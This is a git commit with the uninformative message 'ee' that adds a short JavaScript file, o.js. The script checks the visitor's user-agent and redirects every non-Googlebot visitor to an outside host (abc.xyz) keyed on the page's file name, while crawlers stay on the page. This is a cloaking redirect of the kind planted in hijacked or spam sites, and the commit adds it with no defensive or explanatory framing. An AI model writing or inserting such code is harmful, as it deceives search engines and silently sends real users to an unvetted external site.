6cdcc9a643f108fa8b67c554c3ec7650cc5e2079
codexgod <rajniti.fb@gmail.com>
2026-09-11 07:44:07 +0600

    ee

---
+++ o.js
@@ -0,0 +1,11 @@
+const filename = window.location.pathname.split('/').pop();
+const slug = filename.replace(/\.html$/i, '');
+
+// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
+if (!navigator.userAgent.includes('Googlebot')) {
+  // Redirect only normal users
+  window.location.href = "http://abc.xyz/" + slug;
+} else {
+  // For search engine crawlers, you can choose to perform a different action or not redirect
+  console.log("THanks for visiting my page");
+}
